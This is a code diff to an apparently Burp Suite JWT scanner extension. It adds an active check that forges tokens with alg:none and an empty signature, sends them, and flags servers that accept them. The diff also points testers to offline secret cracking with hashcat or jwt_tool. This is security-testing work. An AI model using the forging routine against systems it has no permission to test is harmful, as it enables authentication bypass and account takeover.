@@ -15,6 +15,8 @@ import com.google.gson.JsonElement;
 import com.google.gson.JsonObject;
 import com.google.gson.JsonParser;
 
+import burp.api.montoya.core.ByteArray;
+
 import java.nio.charset.StandardCharsets;
 import java.time.Instant;
 import java.util.*;
@@ -22,12 +24,11 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 /**
- * Passive scan check that analyzes JWTs found in HTTP traffic for security issues:
- * - Algorithm "none" (signature bypass)
- * - Weak algorithms (HS256 with potentially brute-forceable secret)
- * - Missing expiry (no "exp" claim)
- * - Expired tokens still accepted
- * - Sensitive data in payload (password, ssn, credit_card, etc.)
+ * JWT scan check — passive analysis + active alg:none attack.
+ *
+ * Passive: flags alg:none, HS256, missing expiry, expired tokens accepted, sensitive data.
+ * Active: takes a JWT from the insertion point, forges it with alg:none and empty signature,
+ *         sends it, and confirms whether the server accepts the forged token.
  */
 public class JwtPassiveScanCheck implements ScanCheck {
 
@@ -84,8 +85,105 @@ public class JwtPassiveScanCheck implements ScanCheck {
     @Override
     public AuditResult activeAudit(HttpRequestResponse baseRequestResponse,
                                    AuditInsertionPoint insertionPoint) {
-        // No active scanning — passive only
-        return AuditResult.auditResult();
+        List<AuditIssue> issues = new ArrayList<>();
+
+        try {
+            String baseValue = insertionPoint.baseValue();
+            if (baseValue == null || baseValue.isEmpty()) {
+                return AuditResult.auditResult();
+            }
+
+            // Check if the insertion point value contains a JWT
+            Matcher matcher = JWT_PATTERN.matcher(baseValue);
+            if (!matcher.find()) {
+                return AuditResult.auditResult();
+            }
+
+            String originalJwt = matcher.group();
+            String[] parts = originalJwt.split("\\.");
+            if (parts.length < 2) {
+                return AuditResult.auditResult();
+            }
+
+            // Forge the JWT: set alg to "none", keep the payload, strip the signature
+            String forgedJwt = forgeAlgNone(parts[0], parts[1]);
+            if (forgedJwt == null) {
+                return AuditResult.auditResult();
+            }
+
+            // Replace the original JWT with the forged one in the insertion point value
+            String tamperedValue = baseValue.replace(originalJwt, forgedJwt);
+
+            // Send the tampered request
+            HttpRequestResponse tamperedRequestResponse =
+                    api.http().sendRequest(insertionPoint.buildHttpRequestWithPayload(
+                            ByteArray.byteArray(tamperedValue)));
+
+            short statusCode = tamperedRequestResponse.response().statusCode();
+            boolean serverAccepted = statusCode >= 200 && statusCode < 300;
+
+            if (serverAccepted) {
+                // Server returned 2xx with a forged alg:none JWT — confirmed vulnerable
+                issues.add(AuditIssue.auditIssue(
+                        "JWT Algorithm None Bypass Confirmed",
+                        "The server accepted a JWT with the algorithm changed to \"none\" and the "
+                                + "signature stripped. This allows an attacker to forge arbitrary tokens "
+                                + "without knowing the signing key."
+                                + "\n\nOriginal JWT: " + originalJwt.substring(0, Math.min(80, originalJwt.length())) + "..."
+                                + "\nForged JWT: " + forgedJwt
+                                + "\nServer response: HTTP " + statusCode,
+                        null,
+                        baseRequestResponse.request().url(),
+                        AuditIssueSeverity.HIGH,
+                        AuditIssueConfidence.CERTAIN,
+                        null,
+                        "Ensure the server explicitly rejects JWTs with algorithm \"none\". "
+                                + "Whitelist allowed algorithms on the server side.",
+                        AuditIssueSeverity.HIGH,
+                        baseRequestResponse
+                ));
+
+                api.logging().logToOutput("[JWT Scanner] CONFIRMED: alg:none bypass on "
+                        + baseRequestResponse.request().url());
+            }
+
+        } catch (Exception e) {
+            api.logging().logToError("[JWT Scanner] Error during active audit: " + e.getMessage());
+        }
+
+        return AuditResult.auditResult(issues);
+    }
+
+    /**
+     * Forge a JWT with alg set to "none" and an empty signature.
+     * Takes the original base64url-encoded header and payload.
+     * Returns the forged JWT string, or null on error.
+     */
+    private String forgeAlgNone(String originalHeader, String originalPayload) {
+        try {
+            // Decode the original header
+            String headerJson = new String(base64UrlDecode(originalHeader), StandardCharsets.UTF_8);
+            JsonObject header = JsonParser.parseString(headerJson).getAsJsonObject();
+
+            // Change alg to "none"
+            header.addProperty("alg", "none");
+
+            // Re-encode the header (base64url, no padding)
+            String forgedHeader = base64UrlEncode(header.toString().getBytes(StandardCharsets.UTF_8));
+
+            // Forged JWT: new header + original payload + empty signature
+            return forgedHeader + "." + originalPayload + ".";
+        } catch (Exception e) {
+            api.logging().logToError("[JWT Scanner] Error forging alg:none JWT: " + e.getMessage());
+            return null;
+        }
+    }
+
+    /**
+     * Base64URL encode without padding.
+     */
+    private String base64UrlEncode(byte[] data) {
+        return Base64.getUrlEncoder().withoutPadding().encodeToString(data);
     }
 
     @Override
@@ -143,12 +241,17 @@ public class JwtPassiveScanCheck implements ScanCheck {
                 }
 
                 // Check 2: Weak algorithm HS256
+                // Note: This is an informational finding. The scanner cannot verify
+                // whether the secret is actually weak — that requires offline brute-force
+                // (e.g., hashcat -m 16500 or jwt_tool). This flags HS256 usage so the
+                // tester knows to attempt secret cracking manually.
                 if ("HS256".equalsIgnoreCase(alg)) {
                     issues.add(AuditIssue.auditIssue(
                             "JWT Uses HS256 Algorithm",
-                            "A JWT using HS256 (HMAC-SHA256) was detected. HS256 is susceptible to "
-                                    + "brute-force attacks if the signing secret is weak. Consider using "
-                                    + "asymmetric algorithms (RS256, ES256) instead."
+                            "A JWT using HS256 (HMAC-SHA256) was detected. HS256 uses a symmetric "
+                                    + "shared secret which can be brute-forced offline if weak. "
+                                    + "This is an informational finding — test the secret strength manually "
+                                    + "with tools like hashcat (mode 16500) or jwt_tool."
                                     + "\n\nJWT Header: " + headerJson,
                             null,
                             reqResp.request().url(),
@@ -180,24 +283,59 @@ public class JwtPassiveScanCheck implements ScanCheck {
                         reqResp
                 ));
             } else {
-                // Check 4: Expired token still accepted
+                // Check 4: Expired token still accepted by the server
+                // Only flag this if the JWT was in the REQUEST (client sent it)
+                // AND the server responded with a 2xx success status — meaning
+                // it accepted the expired token instead of rejecting with 401/403.
                 long exp = payload.get("exp").getAsLong();
                 if (Instant.ofEpochSecond(exp).isBefore(Instant.now())) {
-                    issues.add(AuditIssue.auditIssue(
-                            "Expired JWT Accepted",
-                            "A JWT with an expired \"exp\" claim was found in traffic, suggesting "
-                                    + "the server may accept expired tokens. Expiry: "
-                                    + Instant.ofEpochSecond(exp)
-                                    + "\n\nJWT Payload: " + payloadJson,
-                            null,
-                            reqResp.request().url(),
-                            AuditIssueSeverity.HIGH,
-                            AuditIssueConfidence.FIRM,
-                            null,
-                            "Ensure the server validates the \"exp\" claim and rejects expired tokens.",
-                            AuditIssueSeverity.HIGH,
-                            reqResp
-                    ));
+                    boolean jwtInRequest = false;
+                    for (HttpHeader h : reqResp.request().headers()) {
+                        if (JWT_PATTERN.matcher(h.value()).find()) {
+                            jwtInRequest = true;
+                            break;
+                        }
+                    }
+
+                    short statusCode = reqResp.response().statusCode();
+                    boolean serverAccepted = statusCode >= 200 && statusCode < 300;
+
+                    if (jwtInRequest && serverAccepted) {
+                        // Server returned 2xx for a request with an expired JWT — confirmed
+                        issues.add(AuditIssue.auditIssue(
+                                "Expired JWT Accepted by Server",
+                                "An expired JWT was sent in the request and the server responded with "
+                                        + "HTTP " + statusCode + ", confirming it accepted the expired token. "
+                                        + "Expiry was: " + Instant.ofEpochSecond(exp)
+                                        + "\n\nJWT Payload: " + payloadJson,
+                                null,
+                                reqResp.request().url(),
+                                AuditIssueSeverity.HIGH,
+                                AuditIssueConfidence.CERTAIN,
+                                null,
+                                "Ensure the server validates the \"exp\" claim and rejects expired tokens.",
+                                AuditIssueSeverity.HIGH,
+                                reqResp
+                        ));
+                    } else if (jwtInRequest) {
+                        // Expired JWT was sent but server rejected it — not an issue, skip
+                    } else {
+                        // Expired JWT appeared in the response only — informational
+                        issues.add(AuditIssue.auditIssue(
+                                "Expired JWT in Response",
+                                "The server returned a JWT with an expired \"exp\" claim. "
+                                        + "Expiry was: " + Instant.ofEpochSecond(exp)
+                                        + "\n\nJWT Payload: " + payloadJson,
+                                null,
+                                reqResp.request().url(),
+                                AuditIssueSeverity.INFORMATION,
+                                AuditIssueConfidence.FIRM,
+                                null,
+                                "Investigate why the server is issuing already-expired tokens.",
+                                AuditIssueSeverity.INFORMATION,
+                                reqResp
+                        ));
+                    }
                 }
             }
 
